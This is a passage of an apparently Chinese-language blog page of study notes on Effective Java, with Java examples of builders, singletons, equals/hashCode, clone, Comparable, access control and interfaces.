class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hight</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> mHight;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Builder</span> <span class="keyword">extends</span> <span class="title class_">Person</span>.Builder&lt;Builder&gt;&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">double</span> mHight;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(mName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Hight <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Hight</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Builder <span class="title function_">self</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">SetmHight</span><span class="params">(<span class="type">int</span> mHight)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mHight = mHight;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Hight</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(builder);</span><br><span class="line">        mHight = builder.mHight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;名字：&quot;</span> + mName + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;性别：&quot;</span> + mGender + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;年龄：&quot;</span> + mAge + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;身高：&quot;</span> + mHight + <span class="string">&quot;cm&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;职业：&quot;</span> + mJob + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;地址：&quot;</span> + mLocation + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>Weight类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Weight</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> mWeight;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Builder</span> <span class="keyword">extends</span> <span class="title class_">Person</span>.Builder&lt;Builder&gt;&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">double</span> mWeight;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(mName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Weight <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Weight</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Builder <span class="title function_">self</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">SetmWeight</span><span class="params">(<span class="type">int</span> mWeight)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mWeight = mWeight;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Weight</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(builder);</span><br><span class="line">        mWeight = builder.mWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;名字：&quot;</span> + mName + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;性别：&quot;</span> + mGender + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;年龄：&quot;</span> + mAge + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;体重：&quot;</span> + mWeight + <span class="string">&quot;kg&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;职业：&quot;</span> + mJob + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;地址：&quot;</span> + mLocation + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hight</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hight</span>.Builder(<span class="string">&quot;张三&quot;</span>).</span><br><span class="line">                SetmHight(<span class="number">175</span>).SetmAge(<span class="number">24</span>).SetmLocation(<span class="string">&quot;深圳&quot;</span>).</span><br><span class="line">                SetmJob(<span class="string">&quot;学生&quot;</span>).SetmGender(<span class="string">&quot;男&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">        <span class="type">Weight</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Weight</span>.Builder(<span class="string">&quot;李四&quot;</span>).</span><br><span class="line">                SetmWeight(<span class="number">80</span>).SetmAge(<span class="number">24</span>).SetmLocation(<span class="string">&quot;广州&quot;</span>).</span><br><span class="line">                SetmJob(<span class="string">&quot;学生&quot;</span>).SetmGender(<span class="string">&quot;男&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">        System.out.println(h);</span><br><span class="line">        System.out.println(w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="3-用私有构造器或枚举类型强化Singleton属性"   >          <a href="#3-用私有构造器或枚举类型强化Singleton属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-用私有构造器或枚举类型强化Singleton属性" class="headerlink" title="3.用私有构造器或枚举类型强化Singleton属性"></a>3.用私有构造器或枚举类型强化Singleton属性</h2>      <p>Singleton：只实例化一次</p><ul><li>无状态对象，如函数</li><li>系统组件</li></ul><p>实现Singleton</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Emperor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Emperor</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Emperor</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Emperor</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新建一个皇帝类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Emperor</span> <span class="variable">emperor</span> <span class="operator">=</span> Emperor.INSTANCE;</span><br><span class="line">        <span class="type">Emperor</span> <span class="variable">emperor1</span> <span class="operator">=</span> Emperor.INSTANCE;</span><br><span class="line">        <span class="keyword">if</span>(emperor1.equals(emperor)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具有单例属性&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不具有单例属性&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>公有成员是静态工厂方法</p><ul><li>灵活性</li><li>泛型Singleton工厂</li><li>通过方法引用作为提供者</li></ul><p>包含单个元素的枚举类型</p>        <h2 id="4-通过私有构造器强化不可实例化的能力"   >          <a href="#4-通过私有构造器强化不可实例化的能力" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-通过私有构造器强化不可实例化的能力" class="headerlink" title="4.通过私有构造器强化不可实例化的能力"></a>4.通过私有构造器强化不可实例化的能力</h2>      <p>工具类</p><ul><li>无需实例化</li><li>不可为抽象类，可被子类化，子类可被实例化</li></ul>        <h2 id="5-优先考虑依赖注入来引用资源"   >          <a href="#5-优先考虑依赖注入来引用资源" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-优先考虑依赖注入来引用资源" class="headerlink" title="5.优先考虑依赖注入来引用资源"></a>5.优先考虑依赖注入来引用资源</h2>      <p>某些类会依赖底层资源</p><ul><li><p>静态工具类</p></li><li><p>单例实现</p></li><li><p>只可支持单一资源</p></li></ul>        <h2 id="6-避免创建不必要的对象"   >          <a href="#6-避免创建不必要的对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-避免创建不必要的对象" class="headerlink" title="6.避免创建不必要的对象"></a>6.避免创建不必要的对象</h2>      <p>同时提供了静态工厂方法和构造器的不可变类</p><ul><li>静态工厂方法优先</li><li>避免无意识的装箱</li><li>重用已知不会被修改的可变对象</li></ul>        <h2 id="7-消除过期对象引用"   >          <a href="#7-消除过期对象引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-消除过期对象引用" class="headerlink" title="7.消除过期对象引用"></a>7.消除过期对象引用</h2>      <p>Java：垃圾回收功能（过期引用）</p>        <h1 id="第三章-对所有类都通用的方法"   >          <a href="#第三章-对所有类都通用的方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三章-对所有类都通用的方法" class="headerlink" title="第三章 对所有类都通用的方法"></a>第三章 对所有类都通用的方法</h1>              <h2 id="10-覆盖equals方法的通用约定"   >          <a href="#10-覆盖equals方法的通用约定" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-覆盖equals方法的通用约定" class="headerlink" title="10.覆盖equals方法的通用约定"></a>10.覆盖equals方法的通用约定</h2>      <p>equals：判断两个示例是否（逻辑）相等</p><p>object中的equals方法：判断是否为同一个实例</p><p><strong>无需覆盖</strong></p><ul><li>类的每个实例确实是唯一的，例如Thread</li><li>无需关心实例之间是否逻辑相等</li><li>超类已覆盖</li><li>类或包是私有的</li></ul><p><strong>需要覆盖</strong></p><ul><li>有逻辑相等的概念，如两个内容一样的String</li></ul><p>覆盖约定</p><ul><li>自反性：对于非空x，有x.equals(x)返回true</li><li>对称性</li><li>传递性</li><li>一致性：对于非空x，y,当内容不变时，x.euqals(y)不变</li><li>非空性：对于非空x，x.equals(null)，返回false</li></ul><p>高质量equals方法：</p><ul><li>&#x3D;&#x3D;判断是否为该对象的引用</li><li>instanceof判断类型是否正确</li><li>转换参数</li><li>对域和对象校验是否匹配</li><li>满足对称性，传递性，一致性</li></ul>        <h2 id="11-覆盖equals时一定要覆盖hashcode"   >          <a href="#11-覆盖equals时一定要覆盖hashcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#11-覆盖equals时一定要覆盖hashcode" class="headerlink" title="11.覆盖equals时一定要覆盖hashcode"></a>11.覆盖equals时一定要覆盖hashcode</h2>      <p>得以使用HashMap，HashSet，HashTable</p><ul><li>忽略冗余域</li><li>排除equals中没使用的域</li></ul><p>对于不可变类缓存HashCode</p>        <h2 id="12-始终要覆盖toString"   >          <a href="#12-始终要覆盖toString" class="heading-link"><i class="fas fa-link"></i></a><a href="#12-始终要覆盖toString" class="headerlink" title="12.始终要覆盖toString"></a>12.始终要覆盖toString</h2>              <h2 id="13-谨慎覆盖clone方法"   >          <a href="#13-谨慎覆盖clone方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#13-谨慎覆盖clone方法" class="headerlink" title="13.谨慎覆盖clone方法"></a>13.谨慎覆盖clone方法</h2>      <p>cloneable接口决定了Object中受保护的clone方法实现的行为</p><ul><li>一个类实现了cloneable接口，Object的clone方法返回该对象的逐域拷贝，否则抛出异常</li><li>改变了超类中受保护的方法的行为</li></ul>        <h2 id="14-考虑实现Comparable接口"   >          <a href="#14-考虑实现Comparable接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#14-考虑实现Comparable接口" class="headerlink" title="14.考虑实现Comparable接口"></a>14.考虑实现Comparable接口</h2>      <p>满足equals约定：自反性，对称性，传递性</p><p>或者使用Comparator</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator &lt; PhoneNumber &gt; COMPARATOR =</span><br><span class="line">    comparingInt((PhoneNumber pn) - &gt; pn.areaCode)</span><br><span class="line">    .thenComparingInt(pn - &gt; pn.prefix)</span><br><span class="line">    .thenComparingInt(pn - &gt; pn.lineNum);</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(PhoneNumber pn)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> COMPARATOR.compare(<span class="built_in">this</span>, pn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>代码样例：</p><p>Person类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String id, String name, <span class="type">int</span> age, String job)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.job = job;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) o;</span><br><span class="line">        <span class="type">return</span> <span class="variable">age</span> <span class="operator">=</span>= person.age &amp;&amp; id.equals(person.id) &amp;&amp; name.equals(person.name) &amp;&amp; job.equals(person.job);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> id.hashCode();</span><br><span class="line">        result = <span class="number">31</span> * result + name.hashCode();</span><br><span class="line">        result = <span class="number">31</span> * result + Integer.hashCode(age);</span><br><span class="line">        result = <span class="number">31</span> * result + job.hashCode();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, job=&#x27;&quot;</span> + job + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Phone类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phone</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Screen screen;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">        <span class="type">double</span> length;</span><br><span class="line">        <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">        Screen(<span class="type">double</span> length, <span class="type">double</span> weight) &#123;</span><br><span class="line">            <span class="built_in">this</span>.length = length;</span><br><span class="line">            <span class="built_in">this</span>.weight = weight;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Screen <span class="title function_">deepcopy</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Screen</span>(<span class="built_in">this</span>.length, <span class="built_in">this</span>.weight);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="type">Phone</span> <span class="variable">result</span> <span class="operator">=</span> (Phone)<span class="built_in">super</span>.clone();</span><br><span class="line">        result.screen = <span class="built_in">this</span>.screen.deepcopy();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">comparaTo</span><span class="params">(Phone p)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(<span class="built_in">this</span>.screen.length*<span class="built_in">this</span>.screen.weight, p.screen.length*p.screen.weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Phone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.screen.weight = phone.screen.weight;</span><br><span class="line">        <span class="built_in">this</span>.screen.length = phone.screen.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;123456&quot;</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">24</span>, <span class="string">&quot;学生&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.format(<span class="string">&quot;0x%x\n&quot;</span>, person.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="第四章-类与接口"   >          <a href="#第四章-类与接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四章-类与接口" class="headerlink" title="第四章 类与接口"></a>第四章 类与接口</h1>              <h2 id="15-使类和成员的可访问性最小化"   >          <a href="#15-使类和成员的可访问性最小化" class="heading-link"><i class="fas fa-link"></i></a><a href="#15-使类和成员的可访问性最小化" class="headerlink" title="15.使类和成员的可访问性最小化"></a>15.使类和成员的可访问性最小化</h2>      <ul><li>信息隐藏&#x2F;封装<ul><li>各个模块隐藏其细节</li><li>通过API进行通信</li></ul></li><li>信息隐藏的好处<ul><li>解耦</li><li>各个模块可以独立开发测试优化</li><li>提高模块的可重用性</li></ul></li><li>尽可能使每个类或成员不被外界访问</li><li>顶层类和接口<ul><li>包级私有<ul><li>无修饰符</li><li>只可以被包内实用</li></ul></li><li>公有（public）<ul><li>Public修饰符</li><li>包导出的API的一部分</li><li>后续版本需要对其进行支持</li></ul></li><li>若某顶层类（或接口）A只在另一个类B的内部用到，应使A成为B的私有嵌套类</li><li>降低不必要公有类的可访问性更重要</li></ul></li><li>成员（域，方法，嵌套类，嵌套接口）<ul><li>私有的（private）<ul><li>声明该成员的类内部可访问</li></ul></li><li>包级私有的（package-private）<ul><li>包内部的任何类都可访问</li></ul></li><li>受保护的（protected）<ul><li>声明该成员的类的子类可访问</li><li>包内部的任何类都可访问</li></ul></li><li>公有的（public）<ul><li>任何地方都可访问</li></ul></li><li>尽量减少包级私有（相对于私有）</li><li>受保护的成员尽量少用（相对于私有）</li><li>实例域不能是公有的</li><li>静态final常量可以为公有，但不能为可变对象的引用</li></ul></li></ul>        <h2 id="16-在公有类中使用访问方法而非公有域"   >          <a href="#16-在公有类中使用访问方法而非公有域" class="heading-link"><i class="fas fa-link"></i></a><a href="#16-在公有类中使用访问方法而非公有域" class="headerlink" title="16.在公有类中使用访问方法而非公有域"></a>16.在公有类中使用访问方法而非公有域</h2>              <h2 id="17-使可变性最小化"   >          <a href="#17-使可变性最小化" class="heading-link"><i class="fas fa-link"></i></a><a href="#17-使可变性最小化" class="headerlink" title="17.使可变性最小化"></a>17.使可变性最小化</h2>              <h2 id="18-复合优先于继承"   >          <a href="#18-复合优先于继承" class="heading-link"><i class="fas fa-link"></i></a><a href="#18-复合优先于继承" class="headerlink" title="18.复合优先于继承"></a>18.复合优先于继承</h2>      <ul><li>包的内部可以使用，在同一个程序员的控制下</li><li>专门为继承而设计</li></ul><p>复合</p><ul><li>为现有的类为新类的一个组件</li><li>包装类</li></ul>        <h2 id="20-接口优于抽象类"   >          <a href="#20-接口优于抽象类" class="heading-link"><i class="fas fa-link"></i></a><a href="#20-接口优于抽象类" class="headerlink" title="20.接口优于抽象类"></a>20.接口优于抽象类</h2>      <ul><li><p>接口（interface）</p><ul><li>不能实例化</li><li>可实现方法</li><li>类可以实现多个接口</li></ul></li><li><p>抽象类（abstract class）</p><ul><li>不能实例化</li><li>可实现方法</li><li>类只能继承一个抽象类</li></ul></li></ul><p>接口可以方便的实现混合类型，并构造非层次结构的类型框架</p><p>结合接口和抽象类的优点：骨架实现</p><ul><li>接口负责定义类型，或提供一些缺省方法</li><li>骨架类实现其余方法</li></ul><p>定义接口</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Machine</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Movable</span>  &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Vehicle</span> <span class="keyword">extends</span> <span class="title class_">Machine</span>, Movable&#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">run</span><span 